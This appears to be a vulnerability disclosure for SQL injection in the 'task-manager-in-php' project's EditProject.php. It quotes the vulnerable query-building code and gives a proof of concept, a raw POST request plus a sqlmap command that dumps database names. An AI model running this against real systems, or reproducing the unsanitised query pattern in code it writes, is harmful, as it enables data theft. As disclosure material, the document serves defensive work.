# task-manager-in-php-sql1

https://code-projects.org/task-manager-in-php-with-source-code/

## NAME OF AFFECTED PRODUCT(S)

**task-manager-in-php**

## Vendor Homepage

https://code-projects.org/task-manager-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

EditProject.php

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection

## Root Cause

EditProject.php file, SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### EditProject.php

source code，the projectName parameter is not filtered and concatenated into the SQL statement.                                                                                                                                                                                                                                                                                                                                                                                                                                                               

```php
if(isset($_POST['submit'])){
	
	$sql = "UPDATE `project` SET `projectName`='".$_POST['projectName']."',`projectPrio`= '".$_POST['priority']."' WHERE projectID = '".$_POST['projectID']."'";
```

![image](https://github.com/user-attachments/assets/f5609878-ad04-4c81-8ba1-70bc3b109b2c)


## **Vulnerability recurrence**

### **POC**

```
POST /EditProject.php?edit=1&projectID=1 HTTP/1.1
Host: 127.0.0.1
Content-Length: 69
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="127", "Not)A;Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/EditProject.php?edit=1&projectID=1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

projectID=1&projectName=test*&priority=high&submit=%E6%8F%90%E4%BA%A4

```

save as 1
python sqlmap.py -r 1 --dbs
![image](https://github.com/user-attachments/assets/add777d1-384c-471e-a094-317421d9c25b)

